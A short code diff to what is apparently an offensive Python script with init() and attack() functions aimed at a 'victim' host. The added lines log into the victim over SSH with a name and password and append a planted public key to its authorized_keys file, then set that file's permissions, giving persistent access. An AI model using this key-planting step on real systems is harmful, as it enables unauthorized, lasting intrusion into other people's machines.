@@ -19,7 +19,14 @@ def init():
                                                                                        victim['name'],
                                                                                        victim['ip'])
     os.system(command)
-    pass
+
+    # Concatenate public key to authorized keys
+    command = 'cat ~/.ssh/victim_key.pub >> ~/.ssh/authorized_keys'
+    ssh_command_using_name_pw(command)
+
+    # Change mode of authorized keys
+    command = 'chmod 600 ~/.ssh/authorized_keys'
+    ssh_command_using_name_pw(command)
 
 
 def attack():
@@ -81,7 +88,6 @@ def is_root():
 if __name__ == '__main__':
     # Check sudo
     if is_root():
-        print('Do not use \'sudo\'')
         sys.exit('Do not run the script with \'sudo\'')
 
     # Set up user info
